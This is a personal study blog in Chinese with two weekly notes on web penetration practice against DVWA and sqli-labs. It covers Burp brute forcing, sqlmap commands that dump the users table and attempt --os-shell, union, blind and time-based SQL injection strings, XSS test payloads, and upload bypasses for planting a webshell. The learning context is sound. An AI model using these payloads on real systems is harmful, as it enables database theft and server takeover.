第二次技术心得

这一周主要是学了简单使用burpsuite进行简单的爆破，sqlmap的使用，还有xss,CSRF的相关知识。

使用burpsuite进行爆破

  • 首先呢是要在浏览器那里设置好代理，我用的是火狐的FoxyProxy代理插件。
  • 打开burpsuite的proxy模块，设置与浏览器代理一样的ip和端口。
  • 打开浏览器的代理，就可以在burp抓取数据包了
  • 然后就把捉到的数据包发送到intruder模块进行爆破了。
  • 一开始burp会指定变量进行爆破，所以可以先clear变量，然后再add需要爆破的变量。
    简单爆破是挺简单的，但实际的还有token，验证码之类，还需要挺多知识去了解。

    sqlmap

    了解的sql手工注入之后，便开始试了一下sqlmap的使用，在DVWA靶机上进行了sqlmap的注入。
  • 找到注入点之后，直接上了：
    sqlmap.py -u "http://localhost:9096/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#"
    然后发现并没有成功，看了一下，因为是登录进DVWA里面了，便在后面加了–cookie “security=low; PHPSESSID=bm85btcajnani8j6ku0girg013”
    sqlmap.py -u "http://localhost:9096/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit# --cookie "security=low; PHPSESSID=bm85btcajnani8j6ku0girg013"

  • 然后下面就可以看下当前的使用者权限，还有数据库的名了

  • 接着就看表名了(上面得到数据库名为dvwa)
    sqlmap.py -u "url" --cookie "cookie的值" --tables -D "dvwa"
    *查询列(查询到其中一个表名为users)
    sqlmap.py -u "url" --cookie "cookie的值" --columns -T "users"

  • 查询到的类当中有admin,password,查看里面的数据看看
    sqlmap.py -u "url" --cookie "cookie的值" --dump -T "users" -C "user,password"
  • 然后sqlmap还可以通过数据包了查看是否可以注入，形式为：(1.txt里面为数据包的内容，记得放在与sqlmapt同一目录下)
    sqlmap.py -r "1.txt"
  • 然后在百度的时候看到sqlmap还可以写shell,便试了一下
    sqlmap.py -u "url" --cookie "cookie的值" --os-shell
  • 然后我选择了php
  • 然后就需要网站的物理路径了，以为是在靶机里做的，我当然知道，所以在实战当中，还需要知道如何爆出网站的物理路径。
  • 写好路径之后，然后就报错了，没有写入成功，路径弄//转译看下，也是一样，留下没有技术的眼泪，百度了还是一样。
  • 上面虽然没有执行成功，也提供了一个思路，如果执行成功后，还在网站的目录下生成两个文件，一个是上传的文件，一个是执行cmd的文件，访问上传的文件，把一句话木马文件上传，就可以连菜刀了哇。

    xss

    xss主要有放射型、存储型、DOM型，DOM型看了一下，有点难。
  • 放射型主要是存在于URL当中，我们可以构造恶意代码，诱骗用户点击以达到各种效果，比如可以获取cookie
  • 检验有没有xss漏洞可以通过下面几种试一下：

    &lt script&gtalert(1)&lt/script &gt
    &lt img scr=”x” onerror=alert(1) &gt
    &lt iframe onload=alert(1) &gt

  • 但有时服务器会过滤掉script标签之类的，可以大小写混写，嵌套之类的都试一下
  • 存储型xss主要是在一些留言、评论之类的里面构造，然后发送上去，当其它用户浏览时就会触发。

    CSRF

  • 一开始看CSRF感觉有点懵，我自己的理解就是用户访问了网站A，并且生成了cookie,然后在不退出账号的情况下，访问了危险的网站B，网站B要求去访问网站A，由于是带有cookie的，这样就模拟了一次用户的操作
  • 不过构造起来还是很懵的，只能再多看几遍。

记第一次技术心得

发表于 2018-11-18

#记第一次技术心得

  • 回想这一周的所学，主要下面两方面展开，一方面是我学了什么，另一方面是我学这些东西的体会。
  • 首先呢，我主要是从Sqli-labs跟upload-labs这两个学习sql注入跟文件上传的靶机进行学习。下面是关于一次sql注入的大概过程。
  • 以http://xxx.xxx.xxx/abc.php?id=xx为例

  • 首先是判断id=xx,在sql语句当中，是以形式存在的，主要有id=’xx’,id=xx,id=”xx”,可以利用下面的三种进行判断。

    id=1 or 1=1
    id=1’or ‘1’=’1
    id=1” or “1”=”1

  • 然后来判断有多少列(观察是否报错来进行判断)

    id=1’ order by 1 %23

  • 接下来是看那些列可以显示

    id=1’ union select 1,2 %23

  • 然后就是爆出数据库了

    id=1’ union select 1, database() %23

  • 通过数据库名来爆出表名

    id=1’ union select 1,table_name from information _schema.tables where table_schema=’数据库名’ %23

  • 表出来了，下面接着就是列名了_

    id=1’ union select 1,column_name frominformation_schema.columns where table_name=’表明’ %23

  • _基本的过程是这样的，但上面的是比较普通的注入，是基于报错，如果没有报错的话可以通过盲注和时间盲注。
  • 可以通过下面判断数据库的长度

    id=1’and length(database())>5 %23

  • 这个是基于时间的

    id=1’ and if(length(database)=4,sleep(5),1) %23

  • 然后就是通过数据库的位数来猜数据库名了

    id=1’ and ascii(substr(database(),1,1))>97 %23

  • 所以这个还是比较麻烦的，目前sqli-labs是做到less17,还是有挺多的
  • 文件上传的话，主要是绕过过滤的名单，有的也是更改content-type的类型，比如更改后缀名为phtml、php3、php4、php5、PHP、phtm,还有.hataccess形式的，最主要的还有通过cmd里面的copy进行制作一句话木马的图片，但做了这个靶机之后发现，挺多要是要与文件包含一起利用才能达到效果的。
  • 自己的体会的话，最主要的还是要多动手，别人讲了，虽然听懂了，但有的时候接触的东西太多，然后自己有没有动手去做过，到头来，会忘得很快的，然后还有一个就是多记录，也算是对于自己知识的巩固。
